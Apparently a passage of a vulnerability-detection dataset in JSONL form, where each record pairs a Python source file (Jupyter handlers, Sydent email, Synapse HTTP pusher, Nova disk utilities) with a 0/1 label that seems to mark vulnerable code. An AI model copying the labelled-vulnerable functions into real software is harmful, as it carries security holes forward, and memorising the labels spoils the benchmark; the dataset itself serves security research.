self._remove(mount)\n        # Removing a mount might make it ok to add a swapfile again.\n        if self._should_add_swapfile():\n            self.swap = None\n\n    def needs_bootloader_partition(self):\n        '''true if no disk have a boot partition, and one is needed'''\n        # s390x has no such thing\n        if self.bootloader == Bootloader.NONE:\n            return False\n        elif self.bootloader == Bootloader.BIOS:\n            return self._one(type='disk', grub_device=True) is None\n        elif self.bootloader == Bootloader.UEFI:\n            for esp in self._all(type='partition', grub_device=True):\n                if esp.fs() and esp.fs().mount():\n                    if esp.fs().mount().path == '/boot/efi':\n                        return False\n            return True\n        elif self.bootloader == Bootloader.PREP:\n            return self._one(type='partition', grub_device=True) is None\n        else:\n            raise AssertionError(\n                \"unknown bootloader type {}\".format(self.bootloader))\n\n    def _mount_for_path(self, path):\n        return self._one(type='mount', path=path)\n\n    def is_root_mounted(self):\n        return self._mount_for_path('/') is not None\n\n    def can_install(self):\n        return (self.is_root_mounted()\n                and not self.needs_bootloader_partition())\n\n    def _should_add_swapfile(self):\n        mount = self._mount_for_path('/')\n        if mount is not None and mount.device.fstype == 'btrfs':\n            return False\n        for swap in self._all(type='format', fstype='swap'):\n            if swap.mount():\n                return False\n        return True\n", "target": 1}
{"idx": 1042, "func": "\"\"\"Tornado handlers for kernel specifications.\"\"\"\n\n# Copyright (c) IPython Development Team.\n# Distributed under the terms of the Modified BSD License.\n\nimport glob\nimport json\nimport os\npjoin = os.path.join\n\nfrom tornado import web\n\nfrom ...base.handlers import APIHandler, json_errors\nfrom ...utils import url_path_join\n\ndef kernelspec_model(handler, name):\n    \"\"\"Load a KernelSpec by name and return the REST API model\"\"\"\n    ksm = handler.kernel_spec_manager\n    spec = ksm.get_kernel_spec(name)\n    d = {'name': name}\n    d['spec'] = spec.to_dict()\n    d['resources'] = resources = {}\n    resource_dir = spec.resource_dir\n    for resource in ['kernel.js', 'kernel.css']:\n        if os.path.exists(pjoin(resource_dir, resource)):\n            resources[resource] = url_path_join(\n                handler.base_url,\n                'kernelspecs',\n                name,\n                resource\n            )\n    for logo_file in glob.glob(pjoin(resource_dir, 'logo-*')):\n        fname = os.path.basename(logo_file)\n        no_ext, _ = os.path.splitext(fname)\n        resources[no_ext] = url_path_join(\n            handler.base_url,\n            'kernelspecs',\n            name,\n            fname\n        )\n    return d\n\nclass MainKernelSpecHandler(APIHandler):\n    SUPPORTED_METHODS = ('GET',)\n\n    @web.authenticated\n    @json_errors\n    def get(self):\n        ksm = self.kernel_spec_manager\n        km = self.kernel_manager\n        model = {}\n        model['default'] = km.default_kernel_name\n        model['kernelspecs'] = specs = {}\n        for kernel_name in ksm.find_kernel_specs():\n            try:\n                d = kernelspec_model(self, kernel_name)\n            except Exception:\n                self.log.error(\"Failed to load kernel spec: '%s'\", kernel_name, exc_info=True)\n                continue\n            specs[kernel_name] = d\n        self.set_header(\"Content-Type\", 'application/json')\n        self.finish(json.dumps(model))\n\n\nclass KernelSpecHandler(APIHandler):\n    SUPPORTED_METHODS = ('GET',)\n\n    @web.authenticated\n    @json_errors\n    def get(self, kernel_name):\n        try:\n            model = kernelspec_model(self, kernel_name)\n        except KeyError:\n            raise web.HTTPError(404, u'Kernel spec %s not found' % kernel_name)\n        self.set_header(\"Content-Type\", 'application/json')\n        self.finish(json.dumps(model))\n\n\n# URL to handler mappings\n\nkernel_name_regex = r\"(?P<kernel_name>\\w+)\"\n\ndefault_handlers = [\n    (r\"/api/kernelspecs\", MainKernelSpecHandler),\n    (r\"/api/kernelspecs/%s\" % kernel_name_regex, KernelSpecHandler),\n]\n", "target": 0}
{"idx": 1043, "func": "# -*- coding: utf-8 -*-\n\n# Copyright 2014-2015 OpenMarket Ltd\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport logging\nimport socket\nimport random\nimport smtplib\nimport email.utils\nimport string\nimport twisted.python.log\nimport cgi\nimport urllib\n\nimport email.utils\n\nfrom sydent.util import time_msec\n\nlogger = logging.getLogger(__name__)\n\n\ndef sendEmail(sydent, templateName, mailTo, substitutions):\n        mailFrom = sydent.cfg.get('email', 'email.from')\n        mailTemplateFile = sydent.cfg.get('email', templateName)\n\n        myHostname = sydent.cfg.get('email', 'email.hostname')\n        if myHostname == '':\n            myHostname = socket.getfqdn()\n        midRandom = \"\".join([random.choice(string.ascii_letters) for _ in range(16)])\n        messageid = \"<%d%s@%s>\" % (time_msec(), midRandom, myHostname)\n\n        allSubstitutions = {}\n        allSubstitutions.update(substitutions)\n        allSubstitutions.update({\n            'messageid': messageid,\n            'date': email.utils.formatdate(localtime=False),\n            'to': mailTo,\n            'from': mailFrom,\n        })\n\n        for k,v in allSubstitutions.items():\n            allSubstitutions[k] = v.decode('utf8')\n            allSubstitutions[k+\"_forhtml\"] = cgi.escape(v.decode('utf8'))\n            allSubstitutions[k+\"_forurl\"] = urllib.quote(v)\n\n        mailString = open(mailTemplateFile).read().decode('utf8') % allSubstitutions\n        parsedFrom = email.utils.parseaddr(mailFrom)[1]\n        parsedTo = email.utils.parseaddr(mailTo)[1]\n        if parsedFrom == '' or parsedTo == '':\n            logger.info(\"Couldn't parse from / to address %s / %s\", mailFrom, mailTo)\n            raise EmailAddressException()\n\n        mailServer = sydent.cfg.get('email', 'email.smtphost')\n        mailPort = sydent.cfg.get('email', 'email.smtpport')\n        mailUsername = sydent.cfg.get('email', 'email.smtpusername')\n        mailPassword = sydent.cfg.get('email', 'email.smtppassword')\n        mailTLSMode = sydent.cfg.get('email', 'email.tlsmode')\n        logger.info(\"Sending mail to %s with mail server: %s\" % (mailTo, mailServer,))\n        try:\n            if mailTLSMode == 'SSL' or mailTLSMode == 'TLS':\n                smtp = smtplib.SMTP_SSL(mailServer, mailPort, myHostname)\n            elif mailTLSMode == 'STARTTLS':\n                smtp = smtplib.SMTP(mailServer, mailPort, myHostname)\n                smtp.starttls()\n            else:\n                smtp = smtplib.SMTP(mailServer, mailPort, myHostname)\n            if mailUsername != '':\n                smtp.login(mailUsername, mailPassword)\n\n            # We're using the parsing above to do basic validation, but instead of\n            # failing it may munge the address it returns. So we should *not* use\n            # that parsed address, as it may not match any validation done\n            # elsewhere.\n            smtp.sendmail(mailFrom, mailTo, mailString.encode('utf-8'))\n            smtp.quit()\n        except Exception as origException:\n            twisted.python.log.err()\n            ese = EmailSendException()\n            ese.cause = origException\n            raise ese\n\n\nclass EmailAddressException(Exception):\n    pass\n\n\nclass EmailSendException(Exception):\n    pass\n", "target": 0}
{"idx": 1044, "func": "\"\"\"Tornado handlers for the sessions web service.\"\"\"\n\n# Copyright (c) IPython Development Team.\n# Distributed under the terms of the Modified BSD License.\n\nimport json\n\nfrom tornado import web\n\nfrom ...base.handlers import APIHandler, json_errors\nfrom IPython.utils.jsonutil import date_default\nfrom IPython.html.utils import url_path_join, url_escape\nfrom IPython.kernel.kernelspec import NoSuchKernel\n\n\nclass SessionRootHandler(APIHandler):\n\n    @web.authenticated\n    @json_errors\n    def get(self):\n        # Return a list of running sessions\n        sm = self.session_manager\n        sessions = sm.list_sessions()\n        self.finish(json.dumps(sessions, default=date_default))\n\n    @web.authenticated\n    @json_errors\n    def post(self):\n        # Creates a new session\n        #(unless a session already exists for the named nb)\n        sm = self.session_manager\n        cm = self.contents_manager\n        km = self.kernel_manager\n\n        model = self.get_json_body()\n        if model is None:\n            raise web.HTTPError(400, \"No JSON data provided\")\n        try:\n            path = model['notebook']['path']\n        except KeyError:\n            raise web.HTTPError(400, \"Missing field in JSON data: notebook.path\")\n        try:\n            kernel_name = model['kernel']['name']\n        except KeyError:\n            self.log.debug(\"No kernel name specified, using default kernel\")\n            kernel_name = None\n\n        # Check to see if session exists\n        if sm.session_exists(path=path):\n            model = sm.get_session(path=path)\n        else:\n            try:\n                model = sm.create_session(path=path, kernel_name=kernel_name)\n            except NoSuchKernel:\n                msg = (\"The '%s' kernel is not available. Please pick another \"\n                       \"suitable kernel instead, or install that kernel.\" % kernel_name)\n                status_msg = '%s not found' % kernel_name\n                self.log.warn('Kernel not found: %s' % kernel_name)\n                self.set_status(501)\n                self.finish(json.dumps(dict(message=msg, short_message=status_msg)))\n                return\n\n        location = url_path_join(self.base_url, 'api', 'sessions', model['id'])\n        self.set_header('Location', url_escape(location))\n        self.set_status(201)\n        self.finish(json.dumps(model, default=date_default))\n\nclass SessionHandler(APIHandler):\n\n    SUPPORTED_METHODS = ('GET', 'PATCH', 'DELETE')\n\n    @web.authenticated\n    @json_errors\n    def get(self, session_id):\n        # Returns the JSON model for a single session\n        sm = self.session_manager\n        model = sm.get_session(session_id=session_id)\n        self.finish(json.dumps(model, default=date_default))\n\n    @web.authenticated\n    @json_errors\n    def patch(self, session_id):\n        # Currently, this handler is strictly for renaming notebooks\n        sm = self.session_manager\n        model = self.get_json_body()\n        if model is None:\n            raise web.HTTPError(400, \"No JSON data provided\")\n        changes = {}\n        if 'notebook' in model:\n            notebook = model['notebook']\n            if 'path' in notebook:\n                changes['path'] = notebook['path']\n\n        sm.update_session(session_id, **changes)\n        model = sm.get_session(session_id=session_id)\n        self.finish(json.dumps(model, default=date_default))\n\n    @web.authenticated\n    @json_errors\n    def delete(self, session_id):\n        # Deletes the session with given session_id\n        sm = self.session_manager\n        try:\n            sm.delete_session(session_id)\n        except KeyError:\n            # the kernel was deleted but the session wasn't!\n            raise web.HTTPError(410, \"Kernel deleted before session\")\n        self.set_status(204)\n        self.finish()\n\n\n#-----------------------------------------------------------------------------\n# URL to handler mappings\n#-----------------------------------------------------------------------------\n\n_session_id_regex = r\"(?P<session_id>\\w+-\\w+-\\w+-\\w+-\\w+)\"\n\ndefault_handlers = [\n    (r\"/api/sessions/%s\" % _session_id_regex, SessionHandler),\n    (r\"/api/sessions\",  SessionRootHandler)\n]\n\n", "target": 0}
{"idx": 1045, "func": "import json\nfrom tornado import web, gen\nfrom ..base.handlers import IPythonHandler, json_errors\nfrom ..utils import url_path_join\n\nclass TerminalRootHandler(IPythonHandler):\n    @web.authenticated\n    @json_errors\n    def get(self):\n        tm = self.terminal_manager\n        terms = [{'name': name} for name in tm.terminals]\n        self.finish(json.dumps(terms))\n\n    @web.authenticated\n    @json_errors\n    def post(self):\n        \"\"\"POST /terminals creates a new terminal and redirects to it\"\"\"\n        name, _ = self.terminal_manager.new_named_terminal()\n        self.finish(json.dumps({'name': name}))\n\n\nclass TerminalHandler(IPythonHandler):\n    SUPPORTED_METHODS = ('GET', 'DELETE')\n\n    @web.authenticated\n    @json_errors\n    def get(self, name):\n        tm = self.terminal_manager\n        if name in tm.terminals:\n            self.finish(json.dumps({'name': name}))\n        else:\n            raise web.HTTPError(404, \"Terminal not found: %r\" % name)\n\n    @web.authenticated\n    @json_errors\n    @gen.coroutine\n    def delete(self, name):\n        tm = self.terminal_manager\n        if name in tm.terminals:\n            yield tm.terminate(name, force=True)\n            self.set_status(204)\n            self.finish()\n        else:\n            raise web.HTTPError(404, \"Terminal not found: %r\" % name)\n", "target": 1}
{"idx": 1046, "func": "# -*- coding: utf-8 -*-\n# Copyright 2015, 2016 OpenMarket Ltd\n# Copyright 2017 New Vector Ltd\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport logging\n\nfrom prometheus_client import Counter\n\nfrom twisted.internet.error import AlreadyCalled, AlreadyCancelled\n\nfrom synapse.api.constants import EventTypes\nfrom synapse.logging import opentracing\nfrom synapse.metrics.background_process_metrics import run_as_background_process\nfrom synapse.push import PusherConfigException\nfrom synapse.types import RoomStreamToken\n\nfrom . import push_rule_evaluator, push_tools\n\nlogger = logging.getLogger(__name__)\n\nhttp_push_processed_counter = Counter(\n    \"synapse_http_httppusher_http_pushes_processed\",\n    \"Number of push notifications successfully sent\",\n)\n\nhttp_push_failed_counter = Counter(\n    \"synapse_http_httppusher_http_pushes_failed\",\n    \"Number of push notifications which failed\",\n)\n\nhttp_badges_processed_counter = Counter(\n    \"synapse_http_httppusher_badge_updates_processed\",\n    \"Number of badge updates successfully sent\",\n)\n\nhttp_badges_failed_counter = Counter(\n    \"synapse_http_httppusher_badge_updates_failed\",\n    \"Number of badge updates which failed\",\n)\n\n\nclass HttpPusher:\n    INITIAL_BACKOFF_SEC = 1  # in seconds because that's what Twisted takes\n    MAX_BACKOFF_SEC = 60 * 60\n\n    # This one's in ms because we compare it against the clock\n    GIVE_UP_AFTER_MS = 24 * 60 * 60 * 1000\n\n    def __init__(self, hs, pusherdict):\n        self.hs = hs\n        self.store = self.hs.get_datastore()\n        self.storage = self.hs.get_storage()\n        self.clock = self.hs.get_clock()\n        self.state_handler = self.hs.get_state_handler()\n        self.user_id = pusherdict[\"user_name\"]\n        self.app_id = pusherdict[\"app_id\"]\n        self.app_display_name = pusherdict[\"app_display_name\"]\n        self.device_display_name = pusherdict[\"device_display_name\"]\n        self.pushkey = pusherdict[\"pushkey\"]\n        self.pushkey_ts = pusherdict[\"ts\"]\n        self.data = pusherdict[\"data\"]\n        self.last_stream_ordering = pusherdict[\"last_stream_ordering\"]\n        self.backoff_delay = HttpPusher.INITIAL_BACKOFF_SEC\n        self.failing_since = pusherdict[\"failing_since\"]\n        self.timed_call = None\n        self._is_processing = False\n        self._group_unread_count_by_room = hs.config.push_group_unread_count_by_room\n\n        # This is the highest stream ordering we know it's safe to process.\n        # When new events arrive, we'll be given a window of new events: we\n        # should honour this rather than just looking for anything higher\n        # because of potential out-of-order event serialisation. This starts\n        # off as None though as we don't know any better.\n        self.max_stream_ordering = None\n\n        if \"data\" not in pusherdict:\n            raise PusherConfigException(\"No 'data' key for HTTP pusher\")\n        self.data = pusherdict[\"data\"]\n\n        self.name = \"%s/%s/%s\" % (\n            pusherdict[\"user_name\"],\n            pusherdict[\"app_id\"],\n            pusherdict[\"pushkey\"],\n        )\n\n        if self.data is None:\n            raise PusherConfigException(\"data can not be null for HTTP pusher\")\n\n        if \"url\" not in self.data:\n            raise PusherConfigException(\"'url' required in data for HTTP pusher\")\n        self.url = self.data[\"url\"]\n        self.http_client = hs.get_proxied_http_client()\n        self.data_minus_url = {}\n        self.data_minus_url.update(self.data)\n        del self.data_minus_url[\"url\"]\n\n    def on_started(self, should_check_for_notifs):\n        \"\"\"Called when this pusher has been started.\n\n        Args:\n            should_check_for_notifs (bool): Whether we should immediately\n                check for push to send. Set to False only if it's known there\n                is nothing to send\n        \"\"\"\n        if should_check_for_notifs:\n            self._start_processing()\n\n    def on_new_notifications(self, max_token: RoomStreamToken):\n        # We just use the minimum stream ordering and ignore the vector clock\n        # component. This is safe to do as long as we *always* ignore the vector\n        # clock components.\n        max_stream_ordering = max_token.stream\n\n        self.max_stream_ordering = max(\n            max_stream_ordering, self.max_stream_ordering or 0\n        )\n        self._start_processing()\n\n    def on_new_receipts(self, min_stream_id, max_stream_id):\n        # Note that the min here shouldn't be relied upon to be accurate.\n\n        # We could check the receipts are actually m.read receipts here,\n        # but currently that's the only type of receipt anyway...\n        run_as_background_process(\"http_pusher.on_new_receipts\", self._update_badge)\n\n    async def _update_badge(self):\n        # XXX as per https://github.com/matrix-org/matrix-doc/issues/2627, this seems\n        # to be largely redundant. perhaps we can remove it.\n        badge = await push_tools.get_badge_count(\n            self.hs.get_datastore(),\n            self.user_id,\n            group_by_room=self._group_unread_count_by_room,\n        )\n        await self._send_badge(badge)\n\n    def on_timer(self):\n        self._start_processing()\n\n    def on_stop(self):\n        if self.timed_call:\n            try:\n                self.timed_call.cancel()\n            except (AlreadyCalled, AlreadyCancelled):\n                pass\n            self.timed_call = None\n\n    def _start_processing(self):\n        if self._is_processing:\n            return\n\n        run_as_background_process(\"httppush.process\", self._process)\n\n    async def _process(self):\n        # we should never get here if we are already processing\n        assert not self._is_processing\n\n        try:\n            self._is_processing = True\n            # if the max ordering changes while we're running _unsafe_process,\n            # call it again, and so on until we've caught up.\n            while True:\n                starting_max_ordering = self.max_stream_ordering\n                try:\n                    await self._unsafe_process()\n                except Exception:\n                    logger.exception(\"Exception processing notifs\")\n                if self.max_stream_ordering == starting_max_ordering:\n                    break\n        finally:\n            self._is_processing = False\n\n    async def _unsafe_process(self):\n        \"\"\"\n        Looks for unset notifications and dispatch them, in order\n        Never call this directly: use _process which will only allow this to\n        run once per pusher.\n        \"\"\"\n\n        fn = self.store.get_unread_push_actions_for_user_in_range_for_http\n        unprocessed = await fn(\n            self.user_id, self.last_stream_ordering, self.max_stream_ordering\n        )\n\n        logger.info(\n            \"Processing %i unprocessed push actions for %s starting at \"\n            \"stream_ordering %s\",\n            len(unprocessed),\n            self.name,\n            self.last_stream_ordering,\n        )\n\n        for push_action in unprocessed:\n            with opentracing.start_active_span(\n                \"http-push\",\n                tags={\n                    \"authenticated_entity\": self.user_id,\n                    \"event_id\": push_action[\"event_id\"],\n                    \"app_id\": self.app_id,\n                    \"app_display_name\": self.app_display_name,\n                },\n            ):\n                processed = await self._process_one(push_action)\n\n            if processed:\n                http_push_processed_counter.inc()\n                self.backoff_delay = HttpPusher.INITIAL_BACKOFF_SEC\n                self.last_stream_ordering = push_action[\"stream_ordering\"]\n                pusher_still_exists = await self.store.update_pusher_last_stream_ordering_and_success(\n                    self.app_id,\n                    self.pushkey,\n                    self.user_id,\n                    self.last_stream_ordering,\n                    self.clock.time_msec(),\n                )\n                if not pusher_still_exists:\n                    # The pusher has been deleted while we were processing, so\n                    # lets just stop and return.\n                    self.on_stop()\n                    return\n\n                if self.failing_since:\n                    self.failing_since = None\n                    await self.store.update_pusher_failing_since(\n                        self.app_id, self.pushkey, self.user_id, self.failing_since\n                    )\n            else:\n                http_push_failed_counter.inc()\n                if not self.failing_since:\n                    self.failing_since = self.clock.time_msec()\n                    await self.store.update_pusher_failing_since(\n                        self.app_id, self.pushkey, self.user_id, self.failing_since\n                    )\n\n                if (\n                    self.failing_since\n                    and self.failing_since\n                    < self.clock.time_msec() - HttpPusher.GIVE_UP_AFTER_MS\n                ):\n                    # we really only give up so that if the URL gets\n                    # fixed, we don't suddenly deliver a load\n                    # of old notifications.\n                    logger.warning(\n                        \"Giving up on a notification to user %s, pushkey %s\",\n                        self.user_id,\n                        self.pushkey,\n                    )\n                    self.backoff_delay = HttpPusher.INITIAL_BACKOFF_SEC\n                    self.last_stream_ordering = push_action[\"stream_ordering\"]\n                    pusher_still_exists = await self.store.update_pusher_last_stream_ordering(\n                        self.app_id,\n                        self.pushkey,\n                        self.user_id,\n                        self.last_stream_ordering,\n                    )\n                    if not pusher_still_exists:\n                        # The pusher has been deleted while we were processing, so\n                        # lets just stop and return.\n                        self.on_stop()\n                        return\n\n                    self.failing_since = None\n                    await self.store.update_pusher_failing_since(\n                        self.app_id, self.pushkey, self.user_id, self.failing_since\n                    )\n                else:\n                    logger.info(\"Push failed: delaying for %ds\", self.backoff_delay)\n                    self.timed_call = self.hs.get_reactor().callLater(\n                        self.backoff_delay, self.on_timer\n                    )\n                    self.backoff_delay = min(\n                        self.backoff_delay * 2, self.MAX_BACKOFF_SEC\n                    )\n                    break\n\n    async def _process_one(self, push_action):\n        if \"notify\" not in push_action[\"actions\"]:\n            return True\n\n        tweaks = push_rule_evaluator.tweaks_for_actions(push_action[\"actions\"])\n        badge = await push_tools.get_badge_count(\n            self.hs.get_datastore(),\n            self.user_id,\n            group_by_room=self._group_unread_count_by_room,\n        )\n\n        event = await self.store.get_event(push_action[\"event_id\"], allow_none=True)\n        if event is None:\n            return True  # It's been redacted\n        rejected = await self.dispatch_push(event, tweaks, badge)\n        if rejected is False:\n            return False\n\n        if isinstance(rejected, list) or isinstance(rejected, tuple):\n            for pk in rejected:\n                if pk != self.pushkey:\n                    # for sanity, we only remove the pushkey if it\n                    # was the one we actually sent...\n                    logger.warning(\n                        (\"Ignoring rejected pushkey %s because we didn't send it\"), pk,\n                    )\n                else:\n                    logger.info(\"Pushkey %s was rejected: removing\", pk)\n                    await self.hs.remove_pusher(self.app_id, pk, self.user_id)\n        return True\n\n    async def _build_notification_dict(self, event, tweaks, badge):\n        priority = \"low\"\n        if (\n            event.type == EventTypes.Encrypted\n            or tweaks.get(\"highlight\")\n            or tweaks.get(\"sound\")\n        ):\n            # HACK send our push as high priority only if it generates a sound, highlight\n            #  or may do so (i.e. is encrypted so has unknown effects).\n            priority = \"high\"\n\n        if self.data.get(\"format\") == \"event_id_only\":\n            d = {\n                \"notification\": {\n                    \"event_id\": event.event_id,\n                    \"room_id\": event.room_id,\n                    \"counts\": {\"unread\": badge},\n                    \"prio\": priority,\n                    \"devices\": [\n                        {\n                            \"app_id\": self.app_id,\n                            \"pushkey\": self.pushkey,\n                            \"pushkey_ts\": int(self.pushkey_ts / 1000),\n                            \"data\": self.data_minus_url,\n                        }\n                    ],\n                }\n            }\n            return d\n\n        ctx = await push_tools.get_context_for_event(\n            self.storage, self.state_handler, event, self.user_id\n        )\n\n        d = {\n            \"notification\": {\n                \"id\": event.event_id,  # deprecated: remove soon\n                \"event_id\": event.event_id,\n                \"room_id\": event.room_id,\n                \"type\": event.type,\n                \"sender\": event.user_id,\n                \"prio\": priority,\n                \"counts\": {\n                    \"unread\": badge,\n                    # 'missed_calls': 2\n                },\n                \"devices\": [\n                    {\n                        \"app_id\": self.app_id,\n                        \"pushkey\": self.pushkey,\n                        \"pushkey_ts\": int(self.pushkey_ts / 1000),\n                        \"data\": self.data_minus_url,\n                        \"tweaks\": tweaks,\n                    }\n                ],\n            }\n        }\n        if event.type == \"m.room.member\" and event.is_state():\n            d[\"notification\"][\"membership\"] = event.content[\"membership\"]\n            d[\"notification\"][\"user_is_target\"] = event.state_key == self.user_id\n        if self.hs.config.push_include_content and event.content:\n            d[\"notification\"][\"content\"] = event.content\n\n        # We no longer send aliases separately, instead, we send the human\n        # readable name of the room, which may be an alias.\n        if \"sender_display_name\" in ctx and len(ctx[\"sender_display_name\"]) > 0:\n            d[\"notification\"][\"sender_display_name\"] = ctx[\"sender_display_name\"]\n        if \"name\" in ctx and len(ctx[\"name\"]) > 0:\n            d[\"notification\"][\"room_name\"] = ctx[\"name\"]\n\n        return d\n\n    async def dispatch_push(self, event, tweaks, badge):\n        notification_dict = await self._build_notification_dict(event, tweaks, badge)\n        if not notification_dict:\n            return []\n        try:\n            resp = await self.http_client.post_json_get_json(\n                self.url, notification_dict\n            )\n        except Exception as e:\n            logger.warning(\n                \"Failed to push event %s to %s: %s %s\",\n                event.event_id,\n                self.name,\n                type(e),\n                e,\n            )\n            return False\n        rejected = []\n        if \"rejected\" in resp:\n            rejected = resp[\"rejected\"]\n        return rejected\n\n    async def _send_badge(self, badge):\n        \"\"\"\n        Args:\n            badge (int): number of unread messages\n        \"\"\"\n        logger.debug(\"Sending updated badge count %d to %s\", badge, self.name)\n        d = {\n            \"notification\": {\n                \"id\": \"\",\n                \"type\": None,\n                \"sender\": \"\",\n                \"counts\": {\"unread\": badge},\n                \"devices\": [\n                    {\n                        \"app_id\": self.app_id,\n                        \"pushkey\": self.pushkey,\n                        \"pushkey_ts\": int(self.pushkey_ts / 1000),\n                        \"data\": self.data_minus_url,\n                    }\n                ],\n            }\n        }\n        try:\n            await self.http_client.post_json_get_json(self.url, d)\n            http_badges_processed_counter.inc()\n        except Exception as e:\n            logger.warning(\n                \"Failed to send badge count to %s: %s %s\", self.name, type(e), e\n            )\n            http_badges_failed_counter.inc()\n", "target": 1}
{"idx": 1047, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n#    Copyright 2010 United States Government as represented by the\n#    Administrator of the National Aeronautics and Space Administration.\n#    All Rights Reserved.\n#    Copyright (c) 2010 Citrix Systems, Inc.\n#    Copyright (c) 2011 Piston Cloud Computing, Inc\n#    Copyright (c) 2011 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport errno\nimport hashlib\nimport os\nimport re\n\nfrom nova import exception\nfrom nova import flags\nfrom nova.openstack.common import cfg\nfrom nova.openstack.common import jsonutils\nfrom nova.openstack.common import log as logging\nfrom nova import utils\nfrom nova.virt import images\n\n\nLOG = logging.getLogger(__name__)\n\n\nutil_opts = [\n    cfg.StrOpt('image_info_filename_pattern',\n               default='$instances_path/$base_dir_name/%(image)s.info',\n               help='Allows image information files to be stored in '\n                    'non-standard locations')\n    ]\n\nflags.DECLARE('instances_path', 'nova.compute.manager')\nflags.DECLARE('base_dir_name', 'nova.compute.manager')\nFLAGS = flags.FLAGS\nFLAGS.register_opts(util_opts)\n\n\ndef execute(*args, **kwargs):\n    return utils.execute(*args, **kwargs)\n\n\ndef get_iscsi_initiator():\n    \"\"\"Get iscsi initiator name for this machine\"\"\"\n    # NOTE(vish) openiscsi stores initiator name in a file that\n    #            needs root permission to read.\n    contents = utils.read_file_as_root('/etc/iscsi/initiatorname.iscsi')\n    for l in contents.split('\\n'):\n        if l.startswith('InitiatorName='):\n            return l[l.index('=') + 1:].strip()\n\n\ndef create_image(disk_format, path, size):\n    \"\"\"Create a disk image\n\n    :param disk_format: Disk image format (as known by qemu-img)\n    :param path: Desired location of the disk image\n    :param size: Desired size of disk image. May be given as an int or\n                 a string. If given as an int, it will be interpreted\n                 as bytes. If it's a string, it should consist of a number\n                 with an optional suffix ('K' for Kibibytes,\n                 M for Mebibytes, 'G' for Gibibytes, 'T' for Tebibytes).\n                 If no suffix is given, it will be interpreted as bytes.\n    \"\"\"\n    execute('qemu-img', 'create', '-f', disk_format, path, size)\n\n\ndef create_cow_image(backing_file, path):\n    \"\"\"Create COW image\n\n    Creates a COW image with the given backing file\n\n    :param backing_file: Existing image on which to base the COW image\n    :param path: Desired location of the COW image\n    \"\"\"\n    execute('qemu-img', 'create', '-f', 'qcow2', '-o',\n             'backing_file=%s' % backing_file, path)\n\n\ndef create_lvm_image(vg, lv, size, sparse=False):\n    \"\"\"Create LVM image.\n\n    Creates a LVM image with given size.\n\n    :param vg: existing volume group which should hold this image\n    :param lv: name for this image (logical volume)\n    :size: size of image in bytes\n    :sparse: create sparse logical volume\n    \"\"\"\n    free_space = volume_group_free_space(vg)\n\n    def check_size(size):\n        if size > free_space:\n            raise RuntimeError(_('Insufficient Space on Volume Group %(vg)s.'\n                                 ' Only %(free_space)db available,'\n                                 ' but %(size)db required'\n                                 ' by volume %(lv)s.') % locals())\n\n    if sparse:\n        preallocated_space = 64 * 1024 * 1024\n        check_size(preallocated_space)\n        if free_space < size:\n            LOG.warning(_('Volume group %(vg)s will not be able'\n                          ' to hold sparse volume %(lv)s.'\n                          ' Virtual volume size is %(size)db,'\n                          ' but free space on volume group is'\n                          ' only %(free_space)db.') % locals())\n\n        cmd = ('lvcreate', '-L', '%db' % preallocated_space,\n                '--virtualsize', '%db' % size, '-n', lv, vg)\n    else:\n        check_size(size)\n        cmd = ('lvcreate', '-L', '%db' % size, '-n', lv, vg)\n    execute(*cmd, run_as_root=True, attempts=3)\n\n\ndef volume_group_free_space(vg):\n    \"\"\"Return available space on volume group in bytes.\n\n    :param vg: volume group name\n    \"\"\"\n    out, err = execute('vgs', '--noheadings', '--nosuffix',\n                       '--units', 'b', '-o', 'vg_free', vg,\n                       run_as_root=True)\n    return int(out.strip())\n\n\ndef list_logical_volumes(vg):\n    \"\"\"List logical volumes paths for given volume group.\n\n    :param vg: volume group name\n    \"\"\"\n    out, err = execute('lvs', '--noheadings', '-o', 'lv_name', vg,\n                       run_as_root=True)\n\n    return [line.strip() for line in out.splitlines()]\n\n\ndef logical_volume_size(path):\n    \"\"\"Get logical volume size in bytes.\n\n    :param path: logical volume path\n    \"\"\"\n    # TODO(p-draigbrady) POssibly replace with the more general\n    # use of blockdev --getsize64 in future\n    out, _err = execute('lvs', '-o', 'lv_size', '--noheadings', '--units',\n                        'b', '--nosuffix', path, run_as_root=True)\n\n    return int(out)\n\n\ndef clear_logical_volume(path):\n    \"\"\"Obfuscate the logical volume.\n\n    :param path: logical volume path\n    \"\"\"\n    # TODO(p-draigbrady): We currently overwrite with zeros\n    # but we may want to make this configurable in future\n    # for more or less security conscious setups.\n\n    vol_size = logical_volume_size(path)\n    bs = 1024 * 1024\n    remaining_bytes = vol_size\n\n    # The loop caters for versions of dd that\n    # don't support the iflag=count_bytes option.\n    while remaining_bytes:\n        zero_blocks = remaining_bytes / bs\n        seek_blocks = (vol_size - remaining_bytes) / bs\n        zero_cmd = ('dd', 'bs=%s' % bs,\n                    'if=/dev/zero', 'of=%s' % path,\n                    'seek=%s' % seek_blocks, 'count=%s' % zero_blocks)\n        if zero_blocks:\n            utils.execute(*zero_cmd, run_as_root=True)\n        remaining_bytes %= bs\n        bs /= 1024  # Limit to 3 iterations\n\n\ndef remove_logical_volumes(*paths):\n    \"\"\"Remove one or more logical volume.\"\"\"\n\n    for path in paths:\n        clear_logical_volume(path)\n\n    if paths:\n        lvremove = ('lvremove', '-f') + paths\n        execute(*lvremove, 